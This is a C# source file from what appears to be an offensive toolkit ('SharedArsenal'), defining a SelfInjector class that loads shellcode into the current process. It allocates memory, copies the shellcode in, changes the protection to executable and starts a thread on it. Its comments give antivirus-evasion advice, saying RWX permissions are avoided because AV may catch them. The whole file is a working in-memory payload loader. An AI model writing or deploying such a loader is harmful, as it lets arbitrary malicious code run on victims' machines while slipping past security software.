using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharedArsenal.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            // inptr.zero unless you care abour where it gets allocated
            // try to avoid assigning permissions of RWX, AV may catch that
            var basAddress = Native.Kernel32.VirtualAlloc(IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            // could use this
            // Native.Kernel32.WriteProcessMemory
            // but this is a shortcut
            Marshal.Copy(shellcode, 0, basAddress, shellcode.Length);

            Native.Kernel32.VirtualProtect(basAddress, shellcode.Length, Native.Kernel32.MemoryProtection.ExecuteRead, out _);

            Native.Kernel32.CreateThread(IntPtr.Zero, 0, basAddress, IntPtr.Zero, 0, out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}